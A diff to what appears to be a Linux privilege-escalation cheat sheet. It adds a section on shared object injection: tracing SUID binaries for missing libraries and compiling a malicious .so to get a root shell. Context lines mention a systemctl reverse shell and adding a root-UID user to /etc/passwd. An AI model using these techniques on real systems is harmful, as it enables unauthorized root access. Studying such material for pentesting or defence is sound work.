@@ -22,7 +22,7 @@ find / -perm -u=s -type f 2>/dev/null
 find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 ```
 
-## systemctl
+## Exploiting systemctl
 
 #### Reverse shell to root user
 
@@ -55,9 +55,47 @@ new:<hash>:0:0:root:/root:/bin/bash
 su new   
 ```
 
+## Shared Object Injection
+
+When a program executes it will try to load the shared objects it requires from a specific path. If we can write to that directory/path the program tries to open then we can have a root shell spawned by a malicious shared object file (`.so` file).
+
+After finding a SUID binary we can run `strace` on the file and search the output for open/access calls and for "no such file" errors:
+
+```
+strace <full path to file> 2>&1 | grep -iE "open|access|no such file"
+strace -v -f -e execve <command> 2>&1 | grep exec 
+```
+
+The `ldd` and `readelf` commands can also be useed as follows:
+
+```
+ldd $(which <suid binary>)
+readelf $(which <suid binary>)
+```
+
+The `strings` command can also be used to find the shared object names being used by a file.
+
+```
+strings /path/to/file
+```
+
+The ltrace command is a Linux debugging tool that displays calls made to shared libraries and system calls.
+
+```
+ltrace <command>
+```
+
+Compiling a new shared object syntax
+
+```
+gcc -shared -fPIC -o /path/to/original/file.so /path/to/code.c
+```
 
 
 
+
+
+&#x20;
 
 
 
